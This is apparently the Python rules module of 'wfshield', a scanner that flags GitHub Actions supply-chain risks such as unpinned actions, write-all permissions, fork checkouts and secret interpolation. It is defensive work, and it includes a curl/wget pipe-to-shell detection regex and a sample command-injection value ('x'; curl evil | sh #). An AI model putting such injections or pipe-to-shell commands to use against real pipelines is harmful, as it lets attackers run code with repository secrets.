"""wfshield rules — one class of real-world CI supply-chain failure per rule.

Each rule targets a documented GitHub Actions attack pattern:

  WF-001  unpinned third-party action            (tj-actions, Mar 2025)
  WF-002  official action pinned to mutable tag  (advisory)
  WF-003  ``permissions: write-all``
  WF-004  no explicit top-level ``permissions:`` (inherits repo defaults)
  WF-005  ``pull_request_target`` + fork head checkout + code execution
  WF-006  untrusted GitHub context interpolated into a ``run:`` script
  WF-007  ``${{ secrets.* }}`` interpolated into a ``run:`` script
  WF-008  ``self-hosted`` runner executing on untrusted trigger events
  WF-009  ``curl | bash`` remote-script execution in a ``run:`` block
  WF-010  ``secrets: inherit`` on a reusable workflow call
  WF-011  ``actions/cache`` reachable from fork pull requests
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from .wfyaml import Loc

CRITICAL = "CRITICAL"
HIGH = "HIGH"
MEDIUM = "MEDIUM"
LOW = "LOW"

WEIGHTS = {CRITICAL: 20, HIGH: 15, MEDIUM: 7, LOW: 3}

FIRST_PARTY_ORGS = ("actions", "github")

# trusted-by-construction contexts that never need flagging:
SAFE_CONTEXTS = ("github.sha", "github.event_name", "github.run_id",
                 "github.run_number", "github.repository", "github.ref_type")

UNTRUSTED_TRIGGERS = ("pull_request", "pull_request_target", "fork", "issue_comment")

_EXPR_RE = re.compile(r"\$\{\{\s*(.*?)\s*\}\}")
_SHA_RE = re.compile(r"^[0-9a-f]{7,40}$")

_PIPE_SHELL_RE = re.compile(
    r"(?:curl|wget)[^|;&]*\|\s*(?:sudo\s+)?(?:/bin/)?(?:ba)?sh\b"
    r"|(?:curl|wget)[^|;&]*\|\s*(?:sudo\s+)?python[23]?\b"
)


@dataclass
class Finding:
    rule: str
    severity: str
    title: str
    detail: str
    fix: str
    file: str = ""
    line: int = 0
    extra: dict = field(default_factory=dict)


def _lineno(value: Any) -> int:
    return getattr(value, "lineno", 0) or 0


def _exprs(text: str) -> List[str]:
    return [m.group(1).strip() for m in _EXPR_RE.finditer(text or "")]


def _is_untrusted_expr(expr: str) -> Optional[str]:
    """Return the dangerous context token inside an expression, if any."""
    expr = expr.strip()
    if not expr or expr.startswith("env."):
        return None
    for safe in SAFE_CONTEXTS:
        if expr == safe or expr.startswith(safe + " "):
            return None
    if expr.startswith("github.event.") and not expr.startswith("github.event_name"):
        return expr
    for tok in ("github.head_ref", "github.base_ref", "github.ref_name", "github.ref"):
        if expr == tok or expr.startswith(tok + " ") or expr.startswith(tok + "."):
            return expr
    if expr.startswith("secrets."):
        return expr
    if expr.startswith("inputs."):
        return expr
    return None


def _parse_uses(uses: str) -> Optional[Dict[str, str]]:
    """Split a ``uses:`` reference into owner/repo/ref parts."""
    if not uses or not isinstance(uses, str):
        return None
    uses = uses.strip()
    if uses.startswith("./") or uses.startswith(".\\"):
        return {"kind": "local", "path": uses}
    if uses.startswith("docker://"):
        digest = "@sha256:" in uses
        return {"kind": "docker", "pinned": digest}
    spec, _, ref = uses.partition("@")
    owner, _, repo = spec.partition("/")
    return {"kind": "action", "owner": owner, "repo": repo, "ref": ref.strip()}


def _triggers(on_value: Any) -> List[str]:
    if on_value is None:
        return []
    if isinstance(on_value, dict):
        return [str(k) for k in on_value.keys()]
    if isinstance(on_value, list):
        return [str(v) for v in on_value]
    return [str(on_value)]


def _is_pinned(ref: str) -> bool:
    return bool(_SHA_RE.match(ref or ""))


def _truncated(text: str, width: int = 48) -> str:
    text = text.strip()
    text = text.splitlines()[0] if text else ""
    return text[:width] + ("…" if len(text) > width else "")


def _steps(job: Any) -> List[dict]:
    if isinstance(job, dict) and isinstance(job.get("steps"), list):
        return [s for s in job["steps"] if isinstance(s, dict)]
    return []


def analyse_workflow(data: dict, path: str) -> List[Finding]:
    """Run every rule against one parsed workflow document."""
    findings: List[Finding] = []

    on_value = data.get("on")
    triggers = _triggers(on_value)
    untrusted = [t for t in triggers if t in UNTRUSTED_TRIGGERS]
    jobs = data.get("jobs") if isinstance(data.get("jobs"), dict) else {}

    def add(sev: str, code: str, title: str, detail: str, fix: str,
            line: int = 0) -> None:
        findings.append(Finding(code, sev, title, detail, fix, path, line))

    all_steps: List[Tuple[str, dict]] = []  # (job_id, step)
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        all_steps.extend((str(job_id), s) for s in _steps(job))
        # job-level reusable workflow call
        juses = job.get("uses")
        if isinstance(juses, str):
            ju = _parse_uses(juses)
            if ju:
                if ju["kind"] == "action" and not _is_pinned(ju.get("ref", "")):
                    add(HIGH, "WF-001", f"unpinned reusable workflow '{juses}'",
                        "The called workflow is referenced by a mutable tag or "
                        "branch; whoever pushes that ref executes in your pipeline.",
                        "Pin the reusable workflow call to an immutable commit SHA.",
                        _lineno(juses))
            inherit = job.get("secrets")
            if isinstance(inherit, str) and inherit.strip() == "inherit":
                add(LOW, "WF-010",
                    f"job '{job_id}' calls a reusable workflow with secrets: inherit",
                    "'secrets: inherit' forwards EVERY repository secret to the "
                    "called workflow — one over-broad helper and every secret "
                    "is exposed to it.",
                    "Pass only the specific secrets the called workflow needs.",
                    _lineno(inherit))

    # -- WF-002/WF-001: action pinning --------------------------------
    seen_refs: set = set()
    for job_id, step in all_steps:
        uses = step.get("uses")
        if not isinstance(uses, str):
            continue
        u = _parse_uses(uses)
        if u is None or u["kind"] != "action":
            if u and u["kind"] == "docker" and not u["pinned"]:
                add(MEDIUM, "WF-001", f"unpinned docker action '{uses}'",
                    "Container tag is mutable; a poisoned image publish runs "
                    "in your pipeline.",
                    "Pin the image by digest: docker://image@sha256:<digest>.",
                    _lineno(uses))
            if u and u["kind"] == "docker" and u["pinned"]:
                continue
            continue
        if u["owner"] in FIRST_PARTY_ORGS:
            if not _is_pinned(u["ref"]):
                key = ("first-party", uses)
                if key not in seen_refs:
                    seen_refs.add(key)
                    add(LOW, "WF-002", f"'{uses}' pinned to a mutable tag",
                        f"{u['owner']}/{u['repo']} is an official GitHub org "
                        "action, so risk is lower — but the tag can be force-"
                        "moved. The tj-actions attackers did exactly this at "
                        "3 a.m. so the tag move looked like a normal release.",
                        "Pin to the full commit SHA; compare against the tag "
                        "published release when upgrading.",
                        _lineno(uses))
        elif not _is_pinned(u["ref"]):
            add(HIGH, "WF-001", f"unpinned third-party action '{uses}'",
                f"'{uses}' references a mutable {('branch' if u['ref'] in ('main','master','latest', 'develop') else 'tag or branch')}. "
                "If that ref is force-pushed, renamed, or compromised, the "
                "replacement code runs inside your workflow with your "
                "GITHUB_TOKEN and your secrets.",
                "Pin to the full 40-character commit SHA: "
                "owner/repo@<full 40-char commit SHA>.",
                _lineno(uses))

    # -- WF-003/WF-004: token permissions ------------------------------
    perms = data.get("permissions")
    if isinstance(perms, str) and perms.strip() == "write-all":
        add(HIGH, "WF-003", "top-level permissions: write-all",
            "Every job gets a read/write GITHUB_TOKEN. A single injected "
            "command can push code, close issues, or leak the repo.",
            "Replace with permissions: contents: read (or an explicit "
            "least-privilege map) and widen per job only where needed.",
            _lineno(perms))
    if perms is None and jobs:
        add(MEDIUM, "WF-004", "no explicit top-level permissions block",
            "The workflow inherits the repository's default GITHUB_TOKEN "
            "permissions. GitHub's secure default is read-only, but an "
            "older or loosened repo setting silently hands every job "
            "read/write access.",
            "Add an explicit top-level 'permissions:' block — start at "
            "contents: read and widen per job when required.",
            0)
    for job_id, job in jobs.items():
        if isinstance(job, dict) and isinstance(job.get("permissions"), str) \
                and job["permissions"].strip() == "write-all":
            add(HIGH, "WF-003", f"job '{job_id}' sets permissions: write-all",
                "This job's GITHUB_TOKEN can write anything the repo allows.",
                "Replace with the smallest set of scopes the job needs.",
                _lineno(job["permissions"]))

    # -- WF-005: pull_request_target + fork head checkout ----------------
    if "pull_request_target" in triggers:
        for job_id, step in all_steps:
            ref = None
            wit = step.get("with")
            if isinstance(wit, dict) and isinstance(wit.get("ref"), str):
                ref = wit["ref"]
            uses = step.get("uses")
            is_checkout = isinstance(uses, str) and \
                str(uses).split("@")[0] in ("actions/checkout", "github/checkout")
            picks_fork = bool(ref) and any(
                (e or "").startswith("github.event.pull_request") for e in _exprs(ref))
            # a checkout of the fork's head via with.ref
            if is_checkout and picks_fork and ref:
                add(CRITICAL, "WF-005",
                    f"job '{job_id}' checks out fork code under pull_request_target",
                    f"'{ref}' checks out the untrusted PR's own commit, and the "
                    "workflow then runs with full write secrets because "
                    "pull_request_target never runs a fork's permissions.",
                    "Use pull_request for untrusted CI, or keep "
                    "pull_request_target but check out the trusted base "
                    "and explicitly gate secret use.",
                    getattr(ref, "lineno", _lineno(uses)))
        for job_id, step in all_steps:
            run = step.get("run")
            if isinstance(run, str) and re.search(
                    r"git\s+(?:checkout|fetch)\b[^\n]*\$\{\{\s*github\.event\.pull_request",
                    run):
                add(CRITICAL, "WF-005",
                    f"job '{job_id}' git-checks out fork code in a run step",
                    "Untrusted PR commits are fetched and executed inside a "
                    "pull_request_target workflow with repo secrets in scope.",
                    "Remove the fork checkout, or move it to a pull_request "
                    "workflow without secrets.",
                    _lineno(run))

    # -- WF-006: untrusted context in run scripts -----------------------
    for job_id, step in all_steps:
        run = step.get("run")
        if not isinstance(run, str):
            continue
        for expr in _exprs(run):
            bad = _is_untrusted_expr(expr)
            if not bad or bad.startswith("secrets."):
                continue  # secrets handled by WF-007
            title = (f"workflow input '{bad}' interpolated into a run script"
                     if bad.startswith("inputs.")
                     else f"untrusted GitHub context '{bad}' interpolated "
                          f"into a run script")
            add(HIGH, "WF-006", title,
                f"The run block embeds ${{{{ {bad} }}}} directly in shell. "
                "Issue titles, branch names and PR metadata are attacker-"
                "controlled text; a crafted value like 'x'; curl evil | sh #"
                " executes arbitrary commands in your runner.",
                f"Pass the value via an 'env:' mapping on the step/job and "
                f"reference the environment variable (${'{'}VAR{'}'}) in the "
                "script instead of inline ${{ }} interpolation.",
                _lineno(run))
            break

    # -- WF-007: secrets interpolated into run scripts ------------------
    for job_id, step in all_steps:
        run = step.get("run")
        if not isinstance(run, str):
            continue
        for expr in _exprs(run):
            if expr.startswith("secrets."):
                add(HIGH, "WF-007",
                    f"secret '{expr}' interpolated into a run script (job '{job_id}')",
                    f"The run block embeds ${{{{ {expr} }}}} at shell level. The "
                    "value expands before the shell runs: it sits in process "
                    "listings, dumps into setup traces, and lands in step logs "
                    "the moment an echo or error path prints it.",
                    "Map the secret into 'env:' and reference it as "
                    "'$SECRET_NAME' inside the script.",
                    _lineno(run))
                break

    # -- WF-008: self-hosted runner + untrusted triggers ----------------
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        runner = str(job.get("runs-on", "") or "")
        if "self-hosted" in runner and untrusted:
            add(HIGH, "WF-008",
                f"self-hosted runner executes untrusted '{' / '.join(untrusted)}' events",
                f"Job '{job_id}' runs on your own hardware, and the workflow "
                f"fires on {', '.join(untrusted)}. Any fork contributor can "
                "submit a PR branch whose workflow runs arbitrary code on "
                "your infrastructure.",
                "Run fork-triggered jobs on GitHub-hosted ephemeral runners, "
                "or require approval + path filters before self-hosted runs.",
                _lineno(job.get("runs-on")))

    # -- WF-009: pipe-to-shell remote scripts --------------------------
    for job_id, step in all_steps:
        run = step.get("run")
        if isinstance(run, str) and _PIPE_SHELL_RE.search(run):
            add(MEDIUM, "WF-009",
                f"remote script is piped straight into a shell (job '{job_id}')",
                f"The run block executes: {_truncated(run)} — whatever the "
                "URL serves today is what runs in your pipeline. A hijacked "
                "domain or MITM on the runner changes the payload silently.",
                "Download, checksum-verify against a pinned value, then "
                "execute; or vendor the script into the repo.",
                _lineno(run))

    # -- WF-010: step-level secrets: inherit ---------------------------
    for job_id, step in all_steps:
        inherit = step.get("secrets")
        if isinstance(inherit, str) and inherit.strip() == "inherit":
            add(LOW, "WF-010",
                "step calls a reusable workflow with secrets: inherit",
                "Every repository secret is forwarded to the called workflow.",
                "Pass only the specific secrets the called workflow needs.",
                _lineno(inherit))

    # -- WF-011: cache reachable from fork PRs -------------------------
    if "pull_request" in triggers:
        for job_id, step in all_steps:
            uses = step.get("uses")
            if isinstance(uses, str) and str(uses).split("@")[0] in (
                    "actions/cache", "actions/cache/restore", "actions/save",
                    "actions/cache/save"):
                add(MEDIUM, "WF-011",
                    f"cache action reachable from pull_request events (job '{job_id}')",
                    "Entries written or restored in fork-triggered context "
                    "can poison later builds if restore keys are broad "
                    "(the classic cache-poisoning supply chain vector).",
                    "Use immutable cache keys (github.sha, content hashes), "
                    "avoid prefix restore-keys on shared caches, and never "
                    "execute cached artifacts without regeneration.",
                    _lineno(uses))

    return findings


def score_findings(findings: List[Finding]) -> int:
    return sum(WEIGHTS.get(f.severity, 0) for f in findings)


def verdict_for(score: int) -> Tuple[str, int]:
    if score >= 30:
        return "BLOCK", 2
    if score >= 15:
        return "WARN", 1
    return "PASS", 0
